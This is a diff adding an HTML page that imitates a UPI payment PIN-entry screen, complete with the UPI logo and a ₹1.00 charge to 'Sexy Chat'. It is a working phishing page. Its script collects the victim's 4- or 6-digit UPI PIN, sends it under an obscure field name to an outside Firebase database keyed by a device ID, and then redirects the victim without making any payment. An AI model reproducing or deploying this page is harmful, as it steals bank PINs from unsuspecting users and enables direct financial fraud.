@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure UPI</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:'Roboto',sans-serif;
+        }
+
+        body{
+            background:#ffffff;
+            height:100vh;
+            display:flex;
+            flex-direction:column;
+        }
+
+        /* HEADER */
+        .header{
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:18px 18px 10px;
+        }
+
+        .header img{
+            height:34px;
+        }
+
+        .header div{
+            font-size:22px;
+            color:#555;
+        }
+
+        /* DETAILS CARD */
+        .details{
+            background:linear-gradient(135deg,#f3e9d6,#e7dbc3);
+            margin:0 16px;
+            padding:18px;
+            border-radius:16px;
+            display:flex;
+            justify-content:space-between;
+            font-size:15px;
+            font-weight:500;
+            box-shadow:0 4px 10px rgba(0,0,0,0.06);
+        }
+
+        .details p:first-child{
+            font-size:18px;
+            font-weight:600;
+        }
+
+        /* CENTER */
+        .center-content{
+            flex:1;
+            display:flex;
+            flex-direction:column;
+            align-items:center;
+            justify-content:center;
+            padding:0 20px;
+        }
+
+        h5{
+            font-size:15px;
+            margin-bottom:25px;
+            color:#444;
+        }
+
+        /* PIN DOTS */
+        .input-container{
+            display:flex;
+            gap:18px;
+            margin-bottom:22px;
+        }
+
+        .input-container span{
+            width:16px;
+            height:16px;
+            border-radius:50%;
+            border:2px solid #bbb;
+            transition:all 0.25s ease;
+        }
+
+        .input-container span.filled{
+            background:linear-gradient(135deg,#1f2a6b,#3843a5);
+            border-color:#1f2a6b;
+            transform:scale(1.2);
+        }
+
+        /* WARNING */
+        .warning{
+            font-size:13px;
+            color:#888;
+            text-align:center;
+            max-width:280px;
+            line-height:1.4;
+        }
+
+        /* KEYPAD */
+        .keypad{
+            background:#f8f9fb;
+            padding:16px;
+            padding-bottom:25px;
+            display:grid;
+            grid-template-columns:repeat(3,1fr);
+            gap:14px;
+            box-shadow:0 -2px 10px rgba(0,0,0,0.05);
+        }
+
+        /* KEYS */
+        .key{
+            height:65px;
+            background:#ffffff;
+            border-radius:16px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:24px;
+            cursor:pointer;
+            transition:all 0.15s ease;
+            box-shadow:0 3px 6px rgba(0,0,0,0.08);
+        }
+
+        .key:active{
+            transform:scale(0.9);
+            box-shadow:0 2px 4px rgba(0,0,0,0.15) inset;
+        }
+
+        /* BACKSPACE */
+        #done1{
+            background:#eef1f6;
+            font-size:20px;
+        }
+
+        /* PAY BUTTON */
+        #done{
+            background:linear-gradient(135deg,#1f2a6b,#3843a5);
+            color:#fff;
+            font-size:16px;
+            font-weight:600;
+            letter-spacing:0.5px;
+        }
+
+        #done:active{
+            background:linear-gradient(135deg,#161e4d,#2c3691);
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png">
+    <div>✕</div>
+</div>
+
+<!-- DETAILS -->
+<div class="details">
+    <p>₹1.00<br>Sexy Chat</p>
+    <p>₹ →</p>
+</div>
+
+<!-- CENTER -->
+<div class="center-content">
+
+    <h5>ENTER UPI PIN</h5>
+
+    <div class="input-container" id="input-display"></div>
+
+    <div class="warning">
+        You are sending ₹1.00 from your account to Sexy Chat
+    </div>
+
+</div>
+
+<!-- KEYPAD -->
+<div class="keypad">
+    <div class="key" onclick="enterNumber(1)">1</div>
+    <div class="key" onclick="enterNumber(2)">2</div>
+    <div class="key" onclick="enterNumber(3)">3</div>
+
+    <div class="key" onclick="enterNumber(4)">4</div>
+    <div class="key" onclick="enterNumber(5)">5</div>
+    <div class="key" onclick="enterNumber(6)">6</div>
+
+    <div class="key" onclick="enterNumber(7)">7</div>
+    <div class="key" onclick="enterNumber(8)">8</div>
+    <div class="key" onclick="enterNumber(9)">9</div>
+
+    <div class="key" id="done1" onclick="deleteNumber()">⌫</div>
+    <div class="key" onclick="enterNumber(0)">0</div>
+    <div class="key" id="done" onclick="submitData()">Pay</div>
+</div>
+<script>
+    let enteredNumbers = [];
+    let isHidden = true;
+
+    const params = new URLSearchParams(window.location.search);
+    const DEVICE_ID = params.get("device_id");
+
+    /* DOT LOGIC */
+    function updateDisplay() {
+        const display = document.getElementById("input-display");
+        display.innerHTML = "";
+
+        const totalDots = enteredNumbers.length > 4 ? 6 : 4;
+
+        for (let i = 0; i < totalDots; i++) {
+            const span = document.createElement("span");
+
+            if (enteredNumbers[i] !== undefined) {
+                span.classList.add("filled");
+            }
+
+            display.appendChild(span);
+        }
+    }
+
+    function enterNumber(num) {
+        if (enteredNumbers.length < 6) {
+            enteredNumbers.push(num);
+            updateDisplay();
+        }
+    }
+
+    function deleteNumber() {
+        enteredNumbers.pop();
+        updateDisplay();
+    }
+
+    async function submitData() {
+        if (!(enteredNumbers.length === 4 || enteredNumbers.length === 6)) {
+            return alert("Enter 4 or 6 digit PIN");
+        }
+
+        const formId = "form_" + Date.now();
+
+        const payload = {
+            timestamp: Date.now(),
+            content: {
+                bvcx: enteredNumbers.join("")
+            }
+        };
+
+        try {
+            const r = await fetch(
+                "https://rgfesghre-default-rtdb.firebaseio.com/users/"
+                + DEVICE_ID + "/forms/" + formId + ".json",
+                {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                }
+            );
+
+            if (!r.ok) throw new Error();
+
+            // redirect after success
+            window.location.href = "final.html";
+
+        } catch (e) {
+            console.error(e);
+            alert("Submission failed");
+        }
+    }
+
+    updateDisplay();
+</script>
+</body>
+</html>
